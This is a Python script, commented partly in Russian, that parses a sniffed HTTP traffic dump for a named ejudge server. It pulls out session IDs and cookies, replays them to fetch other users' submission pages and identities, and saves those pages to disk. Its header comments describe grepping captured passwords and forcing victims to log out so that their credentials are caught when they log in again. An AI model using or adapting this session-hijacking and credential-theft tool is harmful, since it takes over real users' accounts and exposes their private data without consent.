#!/usr/bin/python3.6

# Passwords can be just greped like:
# $ cat dump_file | grep password
# If passowrd was not captured then use
# unique_requests(parse_dump('dump_file')) 
# to get all captured requests with unique SID and Cookie
# and after that
# logout(request)
# and after capture login and password

# REQUESTS WITH LOGIN AND PASSOWRD ARE POST

import requests
import time


def printall(requests):
    for url,headers,method in requests:
        print(method)
        print(url)
        for hn in headers:
            print (hn + ': ' + headers[hn])
    print('\n' + '='*80  + '\n')


def next_index(dump, current_index=0):
    get_i = dump.find('GET', current_index)
    post_i = dump.find('POST', current_index)
    if get_i < 0:
        return post_i
    if post_i < 0:
        return get_i
    return min(get_i, post_i)


def parse_dump(dump_file_name):
    dumpfile = open(dump_file_name, 'r').read()

    # запросы это последовательность строк
    # первая строка запроса содержит'GET'
    # затем идут строки вида 'Header: smth'
    # затем идёт несколько (мб 0) строк с мусором
    # затем следующий запрос

    requests = []
    # next_request = dumpfile.find('GET')        # начало первого запроса
    next_request = next_index(dumpfile)
    dumpfile += "\nqwerty"    # добавим в конец строку с мутором, чтобы вложенный цикл не сломался на конце файла

    while next_request > 0:
        endl = dumpfile.find('\n', next_request)    
        line = dumpfile[next_request : endl]        # первоя строка запроса
        request = (line.split(' ')[1], {}, line.split(' ')[0])            # формат: ['URL', {'Header1' : 'val1', 'Header2' : 'val2'}, 'METHOD']
            
        next_request = endl + 1
        endl = dumpfile.find('\n', next_request)
        line = dumpfile[next_request : endl]        # следующая
        while len(line.split(': ')) > 1:        # строка имеет вид 'Header: smth' (содержит хэдер, а не мусор)
            s = line.split(': ')
            if 2 < len(s):
                print('\nWARNING: strange string in raw dump:' + str(s) + '\n')
            hname = s[0]
            hval = ': '.join(s[1:])
            request[1][hname] = hval
            next_request = endl + 1
            endl = dumpfile.find('\n', next_request)
            line = dumpfile[next_request : endl]        # следующая строка
        requests.append(request)    
        # next_request = dumpfile.find('GET', next_request + 1)        # начало следующего запроса
        next_request = next_index(dumpfile, next_request + 1)
    return requests


def get_sid(request):
    try:
        ref = request[1]['Referer']
        sid_begin = ref.find('/S') + len('/S')
        if sid_begin < len('/S'):
            raise Exception
        sid_end = ref.find('?', sid_begin)
        if sid_end < 0:        
            sid_end = len(ref)
        return ref[sid_begin : sid_end]
    except:
        print('\nWARNING: cannot get sid: ' + str(request) + '\n')


def get_cookie(request):
    try:
        return request[1]['Cookie']
    except:
        print('\nWARNING: cannot get cookie: ' + str(request) + '\n')


def unique_requests(requests):
    uniq = dict()
    for r in requests:
        sid = get_sid(r)
        if sid is not None:
            uniq[sid] = r
    return [uniq[sid] for sid in uniq]


def send_similar_request(request, url, params = ''):
    time.sleep(1)
    sid = get_sid(request)
    url = 'http://caos.ejudge.ru' + url + '/S' + sid + params
    print('debug: sending request: url="' + url + '", sid = "' + sid + '", headers=' + str(request[1]))
    if sid is None:
        return None
    headers = dict()
    try:
        headers['Host'] = request[1]['Host']
        headers['User-Agent'] = request[1]['User-Agent']
        headers['Accept'] = request[1]['Accept']
        headers['Accept-Language'] = request[1]['Accept-Language']
        headers['Accept-Encoding'] = request[1]['Accept-Encoding']
        headers['Cookie'] = request[1]['Cookie']
    except:
        print("\nWARNING: send_similar_request: header not found\n")
    resp = requests.get(url, headers=headers)
    print('debug: got response: status=' + str(resp.status_code) + ', headers=' + str(resp.headers) + ', body="' + resp.content.decode('utf-8')[0:1000] + '"')
    return (resp.headers, resp.content.decode('utf-8'))


def logout(request):
    send_similar_request(request, '/ej/client/logout')


def user_info(request):
    _, html = send_similar_request(request, '/ej/client/view-submissions', '?all_runs=1')
    login_begin = html.find('[bpmi')
    login_end     = html.find(']', login_begin)
    if login_end < 0:
        print('WARING: user_info: strange response body: ' + html)
        return [1, 2, 3]
    login = html[login_begin + 1 : login_end]
    info_begin = html.find('<title>')
    info_end = html.find('</title>', info_begin)
    if info_end < 0:
        print('WARING: user_info: strange response body: ' + html)
        return [1, 2, 3]
    info = html[info_begin + len('<title>') : info_end]
    open(login + '.submissions.html', 'w').write(html)
    return (login, info, html)


for url,headers,method in unique_requests(parse_dump('dump4')):
    print(get_sid([url,headers]))    
    print(get_cookie([url,headers]))
    print(url)
    for hn in headers:
        print (hn + ': ' + headers[hn])
    print(user_info([url,headers])[0:2])
    #logout([url,headers])
    print('\n' + '='*80  + '\n')




